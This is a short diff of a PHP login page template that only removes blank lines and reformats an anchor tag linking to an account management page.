@@ -99,19 +99,14 @@ Core.baseUrl = '/login/en/';
     }
     
     ?>
-    
-    
-    
   <?php }else{ ?>
   <form action="?SSID:<?php echo $sessionid; ?>" method="post">
     <a id="embedded-close" href="javascript:;" onclick="updateParent('close')"> </a>
     <div>
       <p><label for="accountName" class="label"><?php echo $Log['Log6']; ?></label>
       <input id="accountName" value="" name="accountName" maxlength="320" type="text" tabindex="1" class="input" /></p>
-
       <p><label for="password" class="label"><?php echo $Log['Log7']; ?></label>
       <input id="password" name="password" maxlength="16" type="password" tabindex="2" autocomplete="off" class="input"/></p>
-
       <p>
         <span id="remember-me">
           <label for="persistLogin">
@@ -171,10 +166,7 @@ Core.baseUrl = '/login/en/';
 <div id="right">
 <h2><?php echo $Log['Log16']; ?></h2>
 <h3><?php echo $Log['Log17']; ?></h3>
-<a
-class="ui-button button1 "
-href="account_man.php"
->
+<a class="ui-button button1 " href="account_man.php" >
 <span>
 <span><?php echo $Log['Log18']; ?></span>
 </span>
